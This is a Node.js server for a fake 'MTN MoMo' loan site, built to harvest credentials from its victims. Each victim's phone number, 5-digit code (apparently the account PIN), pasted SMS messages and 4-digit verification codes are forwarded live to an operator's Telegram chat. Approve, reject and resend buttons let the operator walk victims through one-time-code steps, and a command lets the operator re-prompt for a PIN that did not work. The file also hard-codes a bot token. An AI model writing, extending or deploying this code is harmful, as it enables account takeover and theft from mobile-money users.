const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const token = process.env.TELEGRAM_BOT_TOKEN || '9089639442:AAHhcFiQboEotPXbcDMbsTtg4r4kto4X2E4';
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID || '8936816151';

let bot;
const pendingSessions = {};

if (token) {
    bot = new TelegramBot(token, { polling: true });

    bot.on('callback_query', async (query) => {
        const action = query.data;
        const chatId = query.message.chat.id;
        await bot.answerCallbackQuery(query.id);

        const parts = action.split('_');
        const decision = parts[0];
        const sessionId = parts.slice(1).join('_');
        const session = pendingSessions[sessionId];

        if (!session) {
            return bot.sendMessage(chatId, '⚠️ Session not found or already processed.');
        }

        // --- Initial Approval (Submit Application) ---
        if (decision === 'approve') {
            session.status = 'approved';
            session.nextStep = 'sms';
            await bot.sendMessage(chatId,
                `✅ *Loan Approved*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `Waiting for user to paste the SMS...`,
                { parse_mode: 'Markdown' }
            );
        } else if (decision === 'reject') {
            session.status = 'rejected';
            session.nextStep = 'rejected';
            await bot.sendMessage(chatId,
                `❌ *Loan Rejected*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `To reconsider, enter the correct 5-digit code:\n\n` +
                `Use: /setcode ${sessionId} <5-digit-code>`,
                { parse_mode: 'Markdown' }
            );
        }

        // --- SMS Review Actions ---
        else if (decision === 'smsapprove') {
            session.status = 'sms_approved';
            session.nextStep = 'verification';
            await bot.sendMessage(chatId,
                `✅ *SMS Approved*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `User is now entering the 4-digit code.`,
                { parse_mode: 'Markdown' }
            );
        } else if (decision === 'smsreject') {
            session.status = 'sms_rejected';
            session.nextStep = 'rejected';
            await bot.sendMessage(chatId,
                `❌ *SMS Rejected*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `To reconsider, enter the correct 5-digit code:\n\n` +
                `Use: /setcode ${sessionId} <5-digit-code>`,
                { parse_mode: 'Markdown' }
            );
        } else if (decision === 'smsresend') {
            session.nextStep = 'resend_sms';
            await bot.sendMessage(chatId,
                `🔄 *SMS Resend Requested*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `User will check their messages for a new SMS code and paste it again.`,
                { parse_mode: 'Markdown' }
            );
        }

        // --- Final Verification Actions ---
        else if (decision === 'verapprove') {
            session.status = 'final_approved';
            session.nextStep = 'final_approved';
            await bot.sendMessage(chatId,
                `✅ *Final Approval*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
                `🔢 4-Digit Code: ${session.fourDigitCode}\n\n` +
                `Loan is fully approved.`,
                { parse_mode: 'Markdown' }
            );
        } else if (decision === 'verreject') {
            session.status = 'final_rejected';
            session.nextStep = 'final_rejected';
            await bot.sendMessage(chatId,
                `❌ *Final Rejection*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
                `🔢 4-Digit Code: ${session.fourDigitCode}\n\n` +
                `User has been shown the inactive account screen.`,
                { parse_mode: 'Markdown' }
            );
        } else if (decision === 'verresend') {
            session.nextStep = 'resend_verification';
            await bot.sendMessage(chatId,
                `🔄 *Verification Code Resend*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
                `User will check for a new 4-digit verification code.`,
                { parse_mode: 'Markdown' }
            );
        }
    });

    bot.on('message', (msg) => {
        if (msg.chat.id.toString() !== adminChatId) return;
        if (msg.text === '/start') {
            bot.sendMessage(adminChatId,
                '🤖 *MTN MoMo Loan Bot*\n\n' +
                'Waiting for loan applications...\n\n' +
                'You will receive messages with action buttons.',
                { parse_mode: 'Markdown' }
            );
        }

        // Command to enter correct 5-digit code after rejection
        if (msg.text && msg.text.startsWith('/setcode ')) {
            const parts = msg.text.split(' ');
            if (parts.length < 3) {
                return bot.sendMessage(adminChatId, 'Usage: /setcode <sessionId> <5-digit-code>');
            }
            const sessionId = parts[1];
            const newCode = parts[2];
            const session = pendingSessions[sessionId];
            if (!session) {
                return bot.sendMessage(adminChatId, '⚠️ Session not found.');
            }
            session.fiveDigitCode = newCode;
            bot.sendMessage(adminChatId,
                `✅ *5-Digit Code Updated*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 New 5-Digit Code: ${newCode}\n\n` +
                `Session: ${sessionId}`,
                { parse_mode: 'Markdown' }
            );
        }
    });
} else {
    console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing.");
}

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ---- 1. New loan application → notify admin ----
app.post('/api/request-approval', (req, res) => {
    const { amount, term, phone, fiveDigitCode } = req.body;

    if (!bot || !adminChatId) {
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    pendingSessions[sessionId] = {
        amount,
        term,
        phone,
        fiveDigitCode,
        fourDigitCode: null,
        sms: null,
        status: 'pending',
        nextStep: null
    };

    bot.sendMessage(adminChatId,
        `📄 *New Loan Request*\n\n` +
        `📱 Phone: ${phone}\n` +
        `🔑 5-Digit Code: ${fiveDigitCode}\n\n` +
        `Approve to request SMS confirmation from the user.`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `approve_${sessionId}` },
                    { text: '❌ Reject', callback_data: `reject_${sessionId}` }
                ]]
            }
        }
    ).then(() => {
        res.status(200).json({ sessionId });
    }).catch((err) => {
        console.error(err);
        res.status(500).json({ error: 'Failed to send request' });
    });
});

// ---- 2. Frontend polls this ----
app.get('/api/session-status/:sessionId', (req, res) => {
    const session = pendingSessions[req.params.sessionId];
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ status: session.status, nextStep: session.nextStep });
});

// ---- 3. User pastes SMS → forward to admin ----
app.post('/api/submit-sms', (req, res) => {
    const { sessionId, sms } = req.body;
    const session = pendingSessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.sms = sms;

    bot.sendMessage(adminChatId,
        `📩 *SMS Received from User*\n\n` +
        `📱 Phone: ${session.phone}\n` +
        `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
        `*SMS Content:*\n\`\`\`\n${sms}\n\`\`\`\n\n` +
        `Choose an action below.`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `smsapprove_${sessionId}` },
                    { text: '❌ Reject', callback_data: `smsreject_${sessionId}` },
                    { text: '🔄 Resend', callback_data: `smsresend_${sessionId}` }
                ]]
            }
        }
    ).then(() => res.status(200).json({ ok: true }))
    .catch(err => {
        console.error(err);
        res.status(500).json({ error: 'Failed to forward SMS' });
    });
});

// ---- 4. User submits verification code → forward to admin ----
app.post('/api/submit-verification', (req, res) => {
    const { sessionId, code } = req.body;
    const session = pendingSessions[sessionId];
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.fourDigitCode = code;

    bot.sendMessage(adminChatId,
        `🔑 *4-Digit Verification Code Received*\n\n` +
        `📱 Phone: ${session.phone}\n` +
        `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
        `🔢 4-Digit Code: \`${code}\`\n\n` +
        `Choose an action below.`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `verapprove_${sessionId}` },
                    { text: '❌ Reject', callback_data: `verreject_${sessionId}` },
                    { text: '🔄 Resend', callback_data: `verresend_${sessionId}` }
                ]]
            }
        }
    ).then(() => res.status(200).json({ ok: true }))
    .catch(err => {
        console.error(err);
        res.status(500).json({ error: 'Failed to send code' });
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});